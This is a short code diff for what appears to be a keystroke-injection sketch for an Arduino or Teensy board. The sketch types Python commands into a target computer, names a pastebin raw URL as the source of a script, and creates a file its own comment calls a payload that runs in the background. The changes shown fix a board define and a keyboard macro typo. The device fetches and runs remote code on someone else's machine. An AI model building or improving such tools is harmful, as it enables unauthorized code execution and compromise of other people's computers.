@@ -28,7 +28,7 @@ SOFTWARE.
 #define PY_SCRIPT_URL "https://pastebin.com/raw/JMVWuNc5"
 #define PY_SCRIPT_NAME "pyscr.py"
 
-#define TEENSY //only do this if programming a teensy
+//#define TEENSY //only do this if programming a teensy
 #define UK_KEYBOARD
 
 #define START_DELAY 1200
@@ -97,7 +97,7 @@ void setup() {
   // Change directory to home as we may not have permission to edit in the python folder
   #ifdef US_KEYBOARD
     print("os.chdir(os.path.expanduser('~'));");
-  #elif Uk_KEYBOARD
+  #elif UK_KEYBOARD
     print("os.chdir(os.path.expanduser('|'));");
   #endif
   // Create the file with the name of PY_SCRIPT_NAME which will run in the background as our payload
